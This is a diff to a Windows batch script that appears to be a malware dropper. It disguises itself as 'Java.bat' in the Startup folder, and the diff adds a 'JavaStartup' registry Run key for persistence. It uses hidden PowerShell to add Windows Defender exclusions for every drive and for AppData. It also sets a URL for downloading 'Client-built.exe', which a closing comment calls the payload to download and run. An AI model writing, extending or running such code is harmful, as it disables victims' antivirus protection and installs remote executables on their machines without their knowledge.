@@ -6,7 +6,7 @@ if %errorlevel% NEQ 0 (
     exit /b
 )
 
-:: Set variables
+:: Variables
 set "APPDATA_PATH=%USERPROFILE%\AppData"
 set "STARTUP_FOLDER=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
 set "STARTUP_BAT=%STARTUP_FOLDER%\Java.bat"
@@ -14,20 +14,23 @@ set "SELF_PATH=%~f0"
 set "TARGET_FILE=%APPDATA_PATH%\Client-built.exe"
 set "DOWNLOAD_URL=https://github.com/Abdullah67289/Ghoste-Trace/raw/refs/heads/main/Client-built.exe"
 
-:: Copy self to Startup and unblock it
+:: Optional: Copy to Startup folder
 if not exist "%STARTUP_BAT%" (
     copy "%SELF_PATH%" "%STARTUP_BAT%" >nul
     powershell -WindowStyle Hidden -Command "Unblock-File -Path '%STARTUP_BAT%'"
 )
 
-:: Add Defender exclusions (drives)
+:: ✅ Force auto-start by adding to registry
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "JavaStartup" /d "\"%SELF_PATH%\"" /f
+
+:: Add Defender exclusions (all real drives)
 for %%L in (A B C D E F G H I J K L M N O P Q R S T U V W X Y Z) do (
     if exist %%L:\ (
         powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath '%%L:\'"
     )
 )
 
-:: Add Defender exclusion for AppData
+:: Exclude AppData
 powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath '%APPDATA_PATH%'"
 
 :: Download and run payload
